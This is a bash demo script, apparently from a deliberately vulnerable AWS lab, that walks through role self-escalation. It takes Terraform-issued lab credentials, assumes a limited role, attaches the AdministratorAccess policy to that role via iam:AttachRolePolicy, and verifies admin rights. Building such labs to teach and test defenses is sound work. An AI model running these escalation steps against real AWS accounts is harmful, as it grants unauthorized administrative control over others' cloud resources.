#!/bin/bash

# Demo script for iam:AttachRolePolicy privilege escalation
# This is a ROLE-BASED self-escalation scenario

set -e

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
STARTING_USER="pl-prod-iam-009-to-admin-starting-user"
STARTING_ROLE="pl-prod-iam-009-to-admin-starting-role"
MANAGED_POLICY_ARN="arn:aws:iam::aws:policy/AdministratorAccess"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM AttachRolePolicy Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "${YELLOW}Role-Based Self-Escalation${NC}\n"

# Step 1: Get credentials from Terraform output
echo -e "${YELLOW}Step 1: Getting starting user credentials from Terraform${NC}"
cd ../../../../../..  # Go to project root

# Get the module output
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_self_escalation_to_admin_iam_009_iam_attachrolepolicy.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials
export AWS_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
export AWS_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.starting_role_arn')

if [ "$AWS_ACCESS_KEY_ID" == "null" ] || [ -z "$AWS_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

echo -e "${GREEN}✓ Retrieved credentials for $STARTING_USER${NC}\n"

cd - > /dev/null  # Return to scenario directory

# Step 2: Verify identity as user
echo -e "${YELLOW}Step 2: Verifying identity${NC}"
CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_IDENTITY"

if [[ ! $CURRENT_IDENTITY == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as expected user${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified identity as $STARTING_USER${NC}\n"

# Step 3: Assume the starting role
echo -e "${YELLOW}Step 3: Assuming starting role${NC}"
echo "Role ARN: $ROLE_ARN"

ASSUME_ROLE_OUTPUT=$(aws sts assume-role \
    --role-arn "$ROLE_ARN" \
    --role-session-name "arp-demo-session")

# Update credentials to use assumed role
export AWS_ACCESS_KEY_ID=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SessionToken')

echo -e "${GREEN}✓ Successfully assumed role $STARTING_ROLE${NC}\n"

# Step 4: Test current permissions (should be limited)
echo -e "${YELLOW}Step 4: Testing current permissions${NC}"
echo "Attempting to list IAM users (should fail)..."
if aws iam list-users --max-items 1 2>&1 | grep -q "AccessDenied\|not authorized"; then
    echo -e "${GREEN}✓ Confirmed limited permissions${NC}\n"
else
    echo -e "${YELLOW}⚠ Warning: Unexpected permissions${NC}\n"
fi

# Step 5: Perform privilege escalation via AttachRolePolicy
echo -e "${YELLOW}Step 5: Escalating privileges via iam:AttachRolePolicy${NC}"
echo "Attaching AdministratorAccess managed policy to self..."

aws iam attach-role-policy \
    --role-name "$STARTING_ROLE" \
    --policy-arn "$MANAGED_POLICY_ARN"

echo -e "${GREEN}✓ Successfully attached AdministratorAccess policy to self!${NC}\n"

# Wait for policy to propagate
echo -e "${YELLOW}Waiting 15 seconds for policy changes to propagate...${NC}"
sleep 15
echo ""

# Step 6: Verify admin access
echo -e "${YELLOW}Step 6: Verifying administrator access${NC}"
echo "Testing admin permissions (listing IAM users)..."
IAM_USERS=$(aws iam list-users --max-items 5 --query 'Users[*].UserName' --output text)
echo -e "${GREEN}✓ Successfully listed IAM users: $IAM_USERS${NC}"

echo "Testing S3 access..."
aws s3 ls | head -5 || echo -e "${YELLOW}(No buckets or still propagating)${NC}"

echo -e "${GREEN}✓ Confirmed administrator access!${NC}\n"

# Summary
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Attack Summary${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "Starting Point: User ${YELLOW}$STARTING_USER${NC}"
echo -e "Step 1: Assumed role ${YELLOW}$STARTING_ROLE${NC}"
echo -e "Step 2: Used ${YELLOW}iam:AttachRolePolicy${NC} to attach AdministratorAccess to self"
echo -e "Result: ${GREEN}Administrator Access${NC}"
echo ""
echo -e "${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (AssumeRole) → $STARTING_ROLE → (AttachRolePolicy on self) → Admin"
echo ""
echo -e "${RED}IMPORTANT: Run cleanup_attack.sh to detach the AdministratorAccess policy${NC}"
echo ""
